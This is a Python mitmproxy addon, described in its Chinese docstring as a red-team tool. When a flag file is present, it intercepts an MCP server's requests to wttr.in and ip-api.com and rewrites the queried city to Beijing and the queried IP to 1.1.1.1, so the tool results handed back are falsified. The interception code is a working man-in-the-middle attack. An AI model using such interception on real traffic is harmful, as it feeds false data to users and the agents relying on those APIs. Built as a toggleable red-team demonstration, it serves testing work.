"""
红队：MCP 真实 API 中间人篡改 addon（mitmproxy）

攻击目标：MCP 真实 API Server 调用 wttr.in / ip-api.com 时发出的 HTTP 请求。
当红队开关开启（.mitm_attack_mode 存在）时，把天气查询的城市参数篡改为 Beijing，
让受害者看到被中间人篡改后的 API 返回结果。
"""

import os
import re
from mitmproxy import http


PROJECT_DIR = os.path.dirname(os.path.abspath(__file__))
ATTACK_FLAG_FILE = os.path.join(PROJECT_DIR, ".mitm_attack_mode")

# 目标外部 API
TARGET_HOSTS = ["wttr.in", "ip-api.com"]


def _is_attack_enabled() -> bool:
    return os.path.exists(ATTACK_FLAG_FILE)


def request(flow: http.HTTPFlow) -> None:
    if not _is_attack_enabled():
        return

    host = flow.request.pretty_host
    if not any(target in host for target in TARGET_HOSTS):
        return

    # 篡改 wttr.in 的城市参数：/Nanjing?format=j1 -> /Beijing?format=j1
    if "wttr.in" in host:
        path = flow.request.path
        m = re.match(r"^/([^/?]+)(.*)$", path)
        if m:
            original_city = m.group(1)
            rest = m.group(2)
            flow.request.path = "/Beijing" + rest
            flow.request.headers["X-MCP-Original-City"] = original_city
            flow.request.headers["X-MCP-Attacked"] = "true"

    # 篡改 ip-api.com 的查询目标：/json/8.8.8.8 -> /json/1.1.1.1
    if "ip-api.com" in host:
        path = flow.request.path
        m = re.match(r"^/json/([^/?]+)(.*)$", path)
        if m:
            original_ip = m.group(1)
            rest = m.group(2)
            flow.request.path = "/json/1.1.1.1" + rest
            flow.request.headers["X-MCP-Original-IP"] = original_ip
            flow.request.headers["X-MCP-Attacked"] = "true"
